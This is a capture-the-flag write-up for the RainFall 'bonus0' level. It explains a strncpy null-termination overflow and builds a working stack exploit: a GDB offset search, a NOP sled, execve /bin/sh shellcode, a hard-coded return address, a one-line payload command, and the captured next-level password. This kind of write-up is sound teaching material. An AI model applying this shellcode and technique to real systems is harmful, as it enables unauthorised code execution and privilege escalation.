# Bonus 0 - Non-Null-Terminated String Exploitation

## Initial Observation

The program prompts for two inputs and displays them separated by a space:
```bash
bonus0@RainFall:~$ ./bonus0
 -
bla
 -
blabla
bla blabla
```

## Code Analysis

### Function Structure

The binary contains three key functions:

1. **main()** - Entry point
2. **pp()** - Processes and combines inputs
3. **p()** - Reads individual inputs

### The Vulnerability: strncpy and Null Termination

The `p()` function reads up to **4096 characters** into a buffer, then uses `strncpy()` to copy the first 20 bytes.

**Critical vulnerability from the man page:**
> "If the source string has a size greater than that specified in parameter, then the produced string will not be terminated by null ASCII code (character '\0')."

### Buffer Overflow Scenario

When the first input is **20 characters or longer** (non-null-terminated) but the second input is **shorter than 20 characters** (null-terminated), the buffer concatenation creates an overflow:

**Buffer structure:**
```
[arg1: 20 bytes] + [arg2: up to 20 bytes] + [space: 1 byte] + [arg2 again: up to 20 bytes]
```

**Total bytes:** 20 + 20 + 1 + 20 = **61 bytes** into a **42-byte buffer**

This gives us **19 bytes** to overwrite the EIP.

## Finding the EIP Offset

Using GDB with a cyclic pattern:
```gdb
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -  
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
```gdb
(gdb) info registers
eip            0x41336141       0x41336141
```

Using a pattern generator to decode `0x41336141`, we find the **EIP offset is 9 bytes**.

## Exploitation Strategy

### Understanding the Memory Layout

The `p()` function uses a large 4096-byte buffer. Our strategy:

1. Fill this buffer with NOP instructions and shellcode
2. Overwrite EIP with an address pointing into the NOP sled

**Buffer layout:**
```
| [20 bytes NOP - 1st arg] + [NOP padding] + [shellcode] |
^                                                        ^
start address                                      end address
```

### Input Construction

**First input:**
- 20 bytes of NOPs (fills first argument slot)
- Additional NOPs (80 bytes more)
- Shellcode (28 bytes)

**Second input:**
- 9 bytes of padding (to reach EIP offset)
- 4 bytes: return address (pointing into NOP sled)
- 7 bytes: additional padding (completes 20-byte requirement)

## Finding the Buffer Address

Locating the 4096-byte buffer in memory:
```gdb
(gdb) set disassembly-flavor intel
(gdb) disass p
Dump of assembler code for function p:
[...]
   0x080484d0 <+28>:    lea    eax,[ebp-0x1008]    // buffer start
[...]
(gdb) b *p+28
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000
```

**Buffer start address:** `0xbfffe680`

### Calculating Return Address

We need an address within the NOP sled:
- Buffer start: `0xbfffe680`
- After 61 bytes of arguments: `0xbfffe680 + 61 = 0xbfffe6bd`
- After 100 NOP bytes: `0xbfffe680 + 100 = 0xbfffe6e4`

**Chosen address:** `0xbfffe6d0` (safely within NOP sled)

**Little-endian:** `\xd0\xe6\xff\xbf`

## Final Exploit

### Shellcode

Using the same 28-byte shellcode from level9:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### Payload Construction

**First argument:**
```bash
python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
```

**Second argument:**
```bash
python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'
```

### Execution
```bash
(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
```

**Output:**
```
 - 
 - 
AAAAAAAAABBBBBBB AAAAAAAAABBBBBBB
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Credentials

**Username:** bonus1  
**Password:** `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

## Summary

This level demonstrates exploitation of **non-null-terminated string vulnerabilities** combined with buffer overflow.

**Key concepts:**
- Understanding `strncpy()` null-termination behavior
- Exploiting concatenation of non-null-terminated strings
- NOP sled technique for reliable shellcode execution
- Multiple input coordination for complex payload delivery
- Calculating safe return addresses within NOP regions
- String manipulation vulnerabilities in C

**Critical insight:** The vulnerability stems from `strncpy()`'s documented behavior - when copying strings equal to or longer than the specified length, it doesn't add a null terminator. This allows controlled overflow when strings are subsequently concatenated, demonstrating that even "safe" functions can introduce vulnerabilities when misused or when their edge cases aren't properly handled.